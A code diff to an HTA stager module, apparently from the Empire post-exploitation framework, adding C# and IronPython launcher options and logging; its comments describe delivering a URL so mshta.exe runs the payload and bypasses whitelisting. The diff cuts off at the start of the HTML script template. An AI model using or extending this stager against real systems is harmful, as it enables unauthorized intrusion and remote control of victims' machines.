@@ -1,8 +1,11 @@
 from __future__ import print_function
 
+import logging
 from builtins import object
 
 from empire.server.common import helpers
+
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
@@ -10,17 +13,20 @@ class Stager(object):
 
         self.info = {
             "Name": "HTA",
-            "Author": ["@subTee"],
+            "Authors": [
+                {
+                    "Name": "",
+                    "Handle": "@subTee",
+                    "Link": "",
+                }
+            ],
             "Description": "Generates an HTA (HyperText Application) For Internet Explorer",
             "Comments": [
                 "You will need to deliver a url to the target to launch the HTA.  Often bypasses Whitelists since it is executed by mshta.exe"
             ],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -30,7 +36,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "StagerRetries": {
@@ -79,12 +85,9 @@ class Stager(object):
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -110,21 +113,41 @@ class Stager(object):
         if obfuscate.lower() == "true":
             obfuscate_script = True
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listenerName=listener_name,
-            language=language,
-            encode=encode,
-            obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=encode,
+                listener_name=listener_name,
+            )
+
+        elif language == "powershell":
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listener_name,
+                language=language,
+                encode=encode,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+            )
 
         if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
         else:
             code = "<html><head><script>var c= '"
